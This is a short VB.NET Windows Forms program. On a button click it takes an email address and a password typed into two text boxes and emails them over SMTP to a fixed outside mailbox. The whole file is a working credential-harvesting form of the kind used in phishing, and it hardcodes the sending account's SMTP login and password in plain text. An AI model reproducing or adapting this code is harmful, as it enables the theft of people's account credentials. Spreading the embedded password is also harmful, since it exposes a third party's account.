Imports System.Net.Mail
Public Class Form1
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        MyMail()
    End Sub

    Private Sub MyMail()
        Dim myMsg As New MailMessage()
        Try
            myMsg.From = New MailAddress("dim_kolev2002@abv.bg")
            myMsg.To.Add("dim_kolev2002@mail.bg")
            myMsg.Subject = "Proba"
            myMsg.Body = "Email: " & TextBox1.Text & " Pass: " & TextBox2.Text
            Dim SMTP As New SmtpClient("smtp.abv.bg")
            SMTP.Port = 145
            SMTP.EnableSsl = True
            SMTP.Credentials = New System.Net.NetworkCredential("dim_kolev2002@abv.bg", "programist")
            SMTP.Send(myMsg)
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
End Class
